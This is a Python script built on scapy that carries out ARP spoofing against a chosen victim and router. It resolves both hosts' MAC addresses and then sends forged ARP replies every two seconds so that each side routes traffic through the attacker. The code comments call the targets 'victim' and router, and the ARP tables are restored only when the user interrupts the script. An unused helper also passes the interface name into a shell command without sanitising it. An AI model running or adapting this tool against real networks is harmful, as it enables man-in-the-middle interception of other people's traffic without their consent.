import scapy.all as scapy
import optparse
import re 
import subprocess
import time 
#### define options
def options_arg() : 
    parser = optparse.OptionParser()
    #i <interface id >

    parser.add_option("-i","--interface",dest = "interface" , help = "specifying the interface name")
    #t <target ip> <what ip you want him to think is >

    parser.add_option("-t","--target",dest = "target" ,help = "<target ip> <what ip you want him to think is >" )

    return parser.parse_args()[0]

options = options_arg()

#### getting the address ip using the interface

def spoofer_ip(interface) : 
    interface_info = subprocess.run(f"ifconfig {interface} | grep 'inet ' ",shell=True,capture_output=True)
    interface_info = interface_info.stdout.decode().strip()
    info = []
    for n in range(2,6,2) : 
        get = subprocess.run(f"echo {interface_info} | cut -d' ' -f{n}",shell=True,capture_output=True)
        info.append(get.stdout.decode().strip())

    #["10.0.0.174","255.255.255.0","10.0.0.255"]    
    return info

def scan(ip) : 
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast,timeout = 1)[0]
    map_IP_MAC = []
    for ans in answered_list :
        entry = {"ip":f"{ans[1].psrc}","mac":f"{ans[1].hwsrc}"}
        map_IP_MAC.append(entry)
    return map_IP_MAC


# info = spoofer_ip(options.interface)
#### making the arp response (arp spoofing)
def arp_spoofing (target) :
    ### my way
    # target = target.split(" ")

    # mac_dst =  scan(target[0])[0]
    # mac_dst = mac_dst["mac"]
    # arp_response = scapy.ARP(op = 2,hwdst = mac_dst,pdst = target[0] , psrc = target[1] )

    # frame = scapy.Ether(dst = mac_dst)
    # arp_spoof = frame / arp_response
    # unanswered = scapy.srp(arp_spoof,timeout = 1)[1]
    # print(unanswered[0].show())

    pass

def caller(target) : 
    target = target.split(" ")
    #--target 10.0.0.7 10.0.0.15 => target = ["10.0.0.7","10.0.0.15"]

    #we used [0] after scan because we going only to search for 1 host mac (victim or router)
    
    mac_dst_0 =  scan(target[0])[0]
    #mac dst = {ip : x.x.x.x , mac : x:x:x:x:x:x}
    mac_dst_0 = mac_dst_0["mac"]
    mac_dst_1 =  scan(target[1])[0]
    mac_dst_1 = mac_dst_1["mac"]
    #making the victim || router new entry saying that i'am the router || victim by assosiating my mac address (src) with victim mac (src mac) and sending it to the other part
    packet_1 = scapy.ARP(op = 2,hwdst = mac_dst_0,pdst = target[0] , psrc = target[1] )
    packet_2 = scapy.ARP(op = 2,hwdst = mac_dst_1,pdst = target[1] , psrc = target[0] )
    i = 2
    try : 
        while True :         
            scapy.send(packet_1,verbose=False)
            scapy.send(packet_2,verbose=False)
            print(f"\r [+] Packet sent : {i} ", end="")
            i += 2 
            time.sleep(2)
    #when the user click ctrl + c , this code will work first
    except KeyboardInterrupt :
        print("\n [-] CTRL + C Detected .... Quitting  \n ")
        print(" Restoring old config for the victim | router ...")
        #fixing the victim | router arp table by sending the other part src mac (src Mac : Router , dst : victim) , (src Mac : victim , dst : Router)
        packet_1 = scapy.ARP(op = 2,hwdst = mac_dst_0,pdst = target[0] , psrc = target[1] ,hwsrc = mac_dst_1 )
        packet_2 = scapy.ARP(op = 2,hwdst = mac_dst_1,pdst = target[1] , psrc = target[0] ,hwsrc = mac_dst_0 )
        scapy.send(packet_1,verbose=False)
        scapy.send(packet_2,verbose=False)

    pass


caller(options.target)















